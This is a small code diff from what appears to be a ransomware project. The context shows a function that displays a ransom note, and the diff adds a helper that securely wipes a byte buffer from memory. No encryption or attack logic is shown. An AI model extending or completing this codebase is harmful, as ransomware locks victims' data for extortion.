@@ -13,3 +13,9 @@ void display_ransom_note() {
 
 	_tprintf(TEXT("0xNcat\n"));
 }
+
+void erase_data_from_memory(std::vector<BYTE> &data) {
+	SecureZeroMemory(data.data(), data.size());
+	data.clear();
+	data.shrink_to_fit();
+}
